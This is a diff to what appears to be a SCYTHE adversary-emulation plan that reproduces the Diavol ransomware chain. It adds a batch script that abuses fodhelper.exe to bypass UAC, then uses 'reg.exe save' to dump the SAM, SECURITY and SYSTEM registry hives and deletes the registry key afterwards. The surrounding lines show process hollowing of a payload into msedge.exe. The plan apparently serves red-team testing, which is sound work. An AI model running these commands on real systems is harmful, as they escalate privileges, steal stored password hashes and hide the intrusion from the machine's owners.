@@ -76,6 +76,24 @@ This is a multi-stage attack leveraging multiple payloads and execution that per
 11. Inject DiavolStage1 insto msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe```
 
 ### Diavol Stage 1
+Create fodhelper_reg_hashes.bat  and upload to VFS:/shared/Diavol/fodhelper_reg_hashes.bat
+
+```
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\security c:\ProgramData\security.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\system c:\ProgramData\system.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
+```
+
 ```
 delay --time 900
 loader --load run
